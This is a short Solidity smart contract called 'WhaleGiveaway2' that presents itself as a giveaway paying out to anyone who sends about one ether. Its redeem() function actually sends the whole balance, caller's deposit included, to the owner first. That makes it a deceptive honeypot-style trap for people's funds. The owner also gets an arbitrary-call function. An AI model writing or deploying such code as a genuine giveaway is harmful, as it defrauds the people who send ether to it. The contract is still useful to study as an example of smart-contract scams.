pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
address public owner = msg.sender;
uint constant public minEligibility = 0.999001 ether;

function() public payable {}

function redeem() public payable {
require(msg.value >= minEligibility);
owner.transfer(this.balance);
msg.sender.transfer(msg.value);
}

function withdraw() public payable {
require(msg.sender == owner);
owner.transfer(this.balance);
}

function command(address adr, bytes data) public payable {
require(msg.sender == owner);
require(adr.call.value(msg.value)(data));
}
}